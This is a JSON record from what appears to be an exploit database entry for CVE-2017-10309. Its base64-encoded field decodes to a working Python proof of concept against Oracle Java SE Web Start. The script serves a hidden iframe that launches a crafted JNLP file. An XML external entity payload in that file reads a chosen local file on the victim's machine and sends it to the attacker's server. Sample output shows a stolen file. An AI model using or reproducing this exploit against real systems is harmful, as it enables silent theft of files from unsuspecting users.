{
    "source": "exploit-database", 
    "exploit": "IyEvdXNyL2xvY2FsL2Jpbi9weXRob24NCiIiIg0KT3JhY2xlIEphdmEgU0UgV2ViIFN0YXJ0IGpubHAgWE1MIEV4dGVybmFsIEVudGl0eSBQcm9jZXNzaW5nIEluZm9ybWF0aW9uIERpc2Nsb3N1cmUgVnVsbmVyYWJpbGl0eQ0KQWZmZWN0ZWQ6ICAgPD0gdjh1MTMxDQpGaWxlOiAgICAgICBqcmUtOHUxMzEtd2luZG93cy1pNTg2LWlmdHcuZXhlDQpTSEExOiAgICAgICA4NWYwZGUxOTg0NWRlZWY4OWNjNWEyOWVkZWJlNWJiMzMwMjMwNjJkDQpEb3dubG9hZDogICBodHRwOi8vd3d3Lm9yYWNsZS5jb20vdGVjaG5ldHdvcmsvamF2YS9qYXZhc2UvZG93bmxvYWRzL2pyZTgtZG93bmxvYWRzLTIxMzMxNTUuaHRtbA0KUmVmZXJlbmNlczogU1JDLTIwMTctMDAyOCAvIENWRS0yMDE3LTEwMzA5DQpBZHZpc29yeTogICBodHRwOi8vc3JjaW5jaXRlLmlvL2Fkdmlzb3JpZXMvc3JjLTIwMTctMDAyOC8NCg0KVnVsbmVyYWJpbGl0eSBEZXRhaWxzOg0KPT09PT09PT09PT09PT09PT09PT09PQ0KDQpKYXZhIFNFIGluc3RhbGxzIGEgcHJvdG9jb2wgaGFuZGxlciBpbiB0aGUgcmVnaXN0cnkgYXMgIkhLRVlfQ0xBU1NFU19ST09UXGpubHBcU2hlbGxcT3BlblxDb21tYW5kXERlZmF1bHQiICdDOlxQcm9ncmFtIEZpbGVzXEphdmFcanJlMS44LjBfMTMxXGJpblxqcDJsYXVuY2hlci5leGUiIC1zZWN1cmVqd3MgIiUxIicuIA0KVGhpcyBjYW4gYWxsb3cgYWxsb3cgYW4gYXR0YWNrZXIgdG8gbGF1bmNoIHJlbW90ZSBqbmxwIGZpbGVzIHdpdGggbGl0dGxlIHVzZXIgaW50ZXJhY3Rpb24uIEEgbWFsaWNpb3VzIGpubHAgZmlsZSBjb250YWluaW5nIGEgY3JhZnRlZCBYTUwgWFhFIGF0dGFjayB0byBiZSBsZXZlcmFnZWQgdG8gZGlzY2xvc2UgZmlsZXMsIGNhdXNlIGEgZGVuaWFsIG9mIHNlcnZpY2Ugb3IgdHJpZ2dlciBTU1JGLg0KDQpOb3RlczoNCj09PT09PQ0KDQotIEl0IHdpbGwgdGFrZSBhIGZldyBzZWNvbmRzIHRvIGZpcmUuDQotIFNvbWUgYnJvd3NlcnMgd2lsbCBnaXZlIGEgc21hbGwsIGlubm9jZW50IGxvb2tpbmcgcG9wdXAgKG5vdCBhIHNlY3VyaXR5IGFsZXJ0KSwgYnV0IElFL0VkZ2UgZG9lc24ndCBhdCBhbGwuDQoNCkV4YW1wbGU6DQo9PT09PT09PQ0KDQpzYXR1cm46fiBtcl9tZSQgLi9wb2MucHkgDQoNCiAgICBPcmFjbGUgSmF2YSBXZWIgU3RhcnQgSk5MUCBYTUwgRXh0ZXJuYWwgRW50aXR5IFByb2Nlc3NpbmcgSW5mb3JtYXRpb24gRGlzY2xvc3VyZSBWdWxuZXJhYmlsaXR5DQogICAgbXJfbWUgMjAxNw0KDQooKykgdXNhZ2U6IC4vcG9jLnB5IDxmaWxlPg0KKCspIGVnOiAuL3BvYy5weSAnQzovUHJvZ3JhbSBGaWxlcy9KYXZhL2pyZTEuOC4wXzEzMS9SRUFETUUudHh0Jw0KDQpzYXR1cm46fiBtcl9tZSQgLi9wb2MucHkgJ0M6L1Byb2dyYW0gRmlsZXMvSmF2YS9qcmUxLjguMF8xMzEvUkVBRE1FLnR4dCcNCg0KICAgIE9yYWNsZSBKYXZhIFdlYiBTdGFydCBKTkxQIFhNTCBFeHRlcm5hbCBFbnRpdHkgUHJvY2Vzc2luZyBJbmZvcm1hdGlvbiBEaXNjbG9zdXJlIFZ1bG5lcmFiaWxpdHkNCiAgICBtcl9tZSAyMDE3DQoNCigrKSBzZWxlY3QgeW91ciBpbnRlcmZhY2U6IGxvMCwgZ2lmMCwgc3RmMCwgZW4wLCBlbjEsIGVuMiwgYnJpZGdlMCwgcDJwMCwgYXdkbDAsIHZtbmV0MSwgdm1uZXQ4LCB0YXAwOiB2bW5ldDgNCigrKSBzdGFydGluZyB4eGUgc2VydmVyLi4uDQooKykgaGF2ZSBzb21lb25lIHdpdGggSmF2YSBTRSBpbnN0YWxsZWQgdmlzaXQ6IGh0dHA6Ly8xNzIuMTYuMTc1LjE6OTA5MC8NCighKSBmaXJpbmcgd2Vic3RhcnQuLi4NCighKSBkb3dubG9hZGluZyBqbmxwLi4uDQooISkgZG93bmxvYWRpbmcgc2kueG1sLi4uDQooKykgc3RvbGVuOiBQbGVhc2UlMjByZWZlciUyMHRvJTIwaHR0cDovL2phdmEuY29tL2xpY2Vuc2VyZWFkbWUNCl5DKCspIHNodXR0aW5nIGRvd24gdGhlIHdlYiBzZXJ2ZXINCnNhdHVybjp+IG1yX21lJA0KIiIiDQoNCmltcG9ydCBzeXMNCmltcG9ydCBzb2NrZXQNCmltcG9ydCBmY250bA0KaW1wb3J0IHN0cnVjdA0KZnJvbSByYW5kb20gaW1wb3J0IGNob2ljZQ0KZnJvbSBzdHJpbmcgaW1wb3J0IGxvd2VyY2FzZQ0KZnJvbSBCYXNlSFRUUFNlcnZlciBpbXBvcnQgSFRUUFNlcnZlciwgQmFzZUhUVFBSZXF1ZXN0SGFuZGxlcg0KDQp0cnk6DQogICAgaW1wb3J0IG5ldGlmYWNlcyBhcyBuaQ0KZXhjZXB0Og0KICAgIHByaW50ICIoLSkgdHJ5ICdwaXAgaW5zdGFsbCBuZXRpZmFjZXMnIg0KICAgIHN5cy5leGl0KDEpDQoNCmNsYXNzIHh4ZShCYXNlSFRUUFJlcXVlc3RIYW5kbGVyKToNCg0KICAgICMgc3RmdQ0KICAgIGRlZiBsb2dfbWVzc2FnZShzZWxmLCBmb3JtYXQsICphcmdzKToNCiAgICAgICAgcmV0dXJuDQoNCiAgICBkZWYgZG9fR0VUKHNlbGYpOg0KDQogICAgICAgIGlmICJsZWFrZWQiIGluIHNlbGYucGF0aDoNCiAgICAgICAgICAgIHByaW50ICIoKykgc3RvbGVuOiAlcyIgJSBzZWxmLnBhdGguc3BsaXQoIj8iKVsxXQ0KICAgICAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKDIwMCkNCiAgICAgICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQ0KDQogICAgICAgIGVsaWYgc2VsZi5wYXRoID09ICIvIjoNCiAgICAgICAgICAgIHByaW50ICIoISkgZmlyaW5nIHdlYnN0YXJ0Li4uIg0KICAgICAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKDIwMCkNCiAgICAgICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQ0KICAgICAgICAgICAgbWVzc2FnZSA9ICIiIg0KICAgICAgICAgICAgPGh0bWw+DQogICAgICAgICAgICA8Ym9keT4NCiAgICAgICAgICAgIDxpZnJhbWUgc3JjPSJqbmxwOi8vJXM6OTA5MC8lcyIgc3R5bGU9IndpZHRoOjA7aGVpZ2h0OjA7Ym9yZGVyOjA7IGJvcmRlcjpub25lOyI+PC9pZnJhbWU+DQogICAgICAgICAgICA8L2JvZHk+DQogICAgICAgICAgICA8L2h0bWw+DQogICAgICAgICAgICAiIiIgJSAoaXAsIHBhdGgpDQogICAgICAgICAgICBzZWxmLndmaWxlLndyaXRlKG1lc3NhZ2UpDQogICAgICAgICAgICBzZWxmLndmaWxlLndyaXRlKCdcbicpDQoNCiAgICAgICAgZWxpZiAic2kueG1sIiBpbiBzZWxmLnBhdGg6DQogICAgICAgICAgICBwcmludCAiKCEpIGRvd25sb2FkaW5nIHNpLnhtbC4uLiINCiAgICAgICAgICAgIHNlbGYuc2VuZF9yZXNwb25zZSgyMDApDQogICAgICAgICAgICBzZWxmLmVuZF9oZWFkZXJzKCkNCiAgICAgICAgICAgIG1lc3NhZ2UgPSAiIiINCiAgICAgICAgICAgIDwhRU5USVRZICUlIGRhdGEgU1lTVEVNICJmaWxlOi8vLyVzIj4NCiAgICAgICAgICAgIDwhRU5USVRZICUlIHBhcmFtMSAiPCFFTlRJVFkgJiN4MjU7IGV4ZmlsIFNZU1RFTSAnaHR0cDovLyVzOjkwOTAvbGVha2VkPyUlZGF0YTsnPiI+DQogICAgICAgICAgICAiIiIgJSAoZmlsZSwgaXApDQogICAgICAgICAgICBzZWxmLndmaWxlLndyaXRlKG1lc3NhZ2UpDQogICAgICAgICAgICBzZWxmLndmaWxlLndyaXRlKCdcbicpDQoNCiAgICAgICAgZWxpZiBwYXRoIGluIHNlbGYucGF0aDoNCiAgICAgICAgICAgIHByaW50ICIoISkgZG93bmxvYWRpbmcgam5scC4uLiINCiAgICAgICAgICAgIHNlbGYuc2VuZF9yZXNwb25zZSgyMDApDQogICAgICAgICAgICBzZWxmLmVuZF9oZWFkZXJzKCkNCiAgICAgICAgICAgIG1lc3NhZ2UgPSAiIiINCiAgICAgICAgICAgIDw/eG1sIHZlcnNpb249IjEuMCIgPz4NCiAgICAgICAgICAgIDwhRE9DVFlQRSByIFsNCiAgICAgICAgICAgIDwhRUxFTUVOVCByIEFOWSA+DQogICAgICAgICAgICA8IUVOVElUWSAlJSBzcCBTWVNURU0gImh0dHA6Ly8lczo5MDkwL3NpLnhtbCI+DQogICAgICAgICAgICAlJXNwOw0KICAgICAgICAgICAgJSVwYXJhbTE7DQogICAgICAgICAgICAlJWV4ZmlsOw0KICAgICAgICAgICAgXT4NCiAgICAgICAgICAgICIiIiAlIGlwDQogICAgICAgICAgICBzZWxmLndmaWxlLndyaXRlKG1lc3NhZ2UpDQogICAgICAgICAgICBzZWxmLndmaWxlLndyaXRlKCdcbicpDQogICAgICAgIHJldHVybg0KDQpkZWYgYmFubmVyKCk6DQogICAgcmV0dXJuICIiIlxuXHRPcmFjbGUgSmF2YSBXZWIgU3RhcnQgSk5MUCBYTUwgRXh0ZXJuYWwgRW50aXR5IFByb2Nlc3NpbmcgSW5mb3JtYXRpb24gRGlzY2xvc3VyZSBWdWxuZXJhYmlsaXR5XG5cdG1yX21lIDIwMTdcbiIiIg0KDQppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOg0KDQogICAgcHJpbnQgYmFubmVyKCkNCg0KICAgIGlmIGxlbihzeXMuYXJndikgIT0gMjoNCiAgICAgICAgcHJpbnQgIigrKSB1c2FnZTogJXMgPGZpbGU+IiAlIHN5cy5hcmd2WzBdDQogICAgICAgIHByaW50ICIoKykgZWc6ICVzICdDOi9Qcm9ncmFtIEZpbGVzL0phdmEvanJlMS44LjBfMTMxL1JFQURNRS50eHQnIiAlIHN5cy5hcmd2WzBdDQogICAgICAgIHN5cy5leGl0KDEpDQoNCiAgICBmaWxlID0gc3lzLmFyZ3ZbMV0NCg0KICAgICMgcmFuZG9taXplIGluY2FzZSB3ZSBjaGFuZ2UgcGF5bG9hZHMgYW5kIGJyb3dzZXIgY2FjaGVzDQogICAgcGF0aCAgPSAiIi5qb2luKGNob2ljZShsb3dlcmNhc2UpIGZvciBpIGluIHJhbmdlKDEwKSkNCiAgICBwYXRoICs9ICIuam5scCINCg0KICAgICMgaW50ZXJmYWNlcw0KICAgIGludHMgPSAiIg0KICAgIGZvciBpIGluIG5pLmludGVyZmFjZXMoKTogaW50cyArPSAiJXMsICIgJSBpDQogICAgaW50ZXJmYWNlID0gcmF3X2lucHV0KCIoKykgc2VsZWN0IHlvdXIgaW50ZXJmYWNlOiAlczogIiAlIGludHNbOi0yXSkNCg0KICAgICMgZ2V0IHRoZSBpcCBmcm9tIHRoZSBpbnRlcmZhY2UNCiAgICB0cnk6DQogICAgICAgIGlwID0gbmkuaWZhZGRyZXNzZXMoaW50ZXJmYWNlKVsyXVswXVsnYWRkciddDQogICAgZXhjZXB0Og0KICAgICAgICBwcmludCAiKC0pIG5vIGlwIGFkZHJlc3MgYXNzb2NpYXRlZCB3aXRoIHRoYXQgaW50ZXJmYWNlISINCiAgICAgICAgc3lzLmV4aXQoMSkNCiAgICBwcmludCAiam5scDovLyVzOjkwOTAvJXMiICUgKGlwLCBwYXRoKQ0KICAgIHRyeToNCiAgICAgICAgc2VydmVyID0gSFRUUFNlcnZlcigoJzAuMC4wLjAnLCA5MDkwKSwgeHhlKQ0KICAgICAgICBwcmludCAnKCspIHN0YXJ0aW5nIHh4ZSBzZXJ2ZXIuLi4nDQogICAgICAgIHByaW50ICcoKykgaGF2ZSBzb21lb25lIHdpdGggSmF2YSBTRSBpbnN0YWxsZWQgdmlzaXQ6IGh0dHA6Ly8lczo5MDkwLycgJSBpcA0KICAgICAgICBzZXJ2ZXIuc2VydmVfZm9yZXZlcigpDQoNCiAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6DQogICAgICAgIHByaW50ICcoKykgc2h1dHRpbmcgZG93biB0aGUgd2ViIHNlcnZlcicNCiAgICAgICAgc2VydmVyLnNvY2tldC5jbG9zZSgp", 
    "id": "43103", 
    "cves": [
        "CVE-2017-10309"
    ]
}